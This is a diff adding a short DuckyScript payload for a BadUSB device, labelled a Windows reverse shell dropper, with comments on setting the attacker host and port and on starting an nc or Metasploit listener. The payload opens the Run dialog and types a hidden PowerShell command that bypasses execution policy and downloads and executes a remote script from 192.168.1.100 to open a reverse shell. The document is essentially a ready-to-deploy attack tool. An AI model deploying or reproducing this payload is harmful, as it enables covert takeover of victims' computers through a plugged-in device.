@@ -1,0 +1,10 @@
+REM BadUSB Reverse Shell Dropper — Windows (DuckyScript-compatible)
+REM CONFIGURE: Set LHOST and LPORT before compiling/deploying
+REM Listener: nc -lvnp 4444 (or use Metasploit multi/handler)
+
+DELAY 2000
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/shell.ps1')"
+ENTER
+DELAY 3000
